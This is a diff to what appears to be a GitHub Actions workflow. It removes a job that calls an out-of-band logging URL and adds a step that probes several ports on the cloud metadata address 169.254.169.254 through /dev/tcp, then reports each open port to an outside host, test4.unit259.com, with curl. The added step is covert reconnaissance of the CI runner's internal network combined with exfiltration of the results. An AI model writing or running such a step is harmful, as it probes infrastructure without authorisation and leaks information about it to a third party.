@@ -1,12 +1,8 @@
-name: Test Referer Leak
-on:
-  push:
-    branches: [ main ]
-jobs:
-  leak-referer:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout code
-        uses: actions/checkout@v3
-      - name: Curl OOB URL
-        run: curl -v https://test4.unit259.com//log?prefix=action
+- name: Internal port scan
+  run: |
+    for p in 22 80 443 3306 5432; do
+      timeout 1 bash -c "echo > /dev/tcp/169.254.169.254/$p" 2>/dev/null && \
+      curl -sG https://test4.unit259.com/log \
+        --data-urlencode prefix=internal-scan \
+        --data-urlencode port=$p
+    done
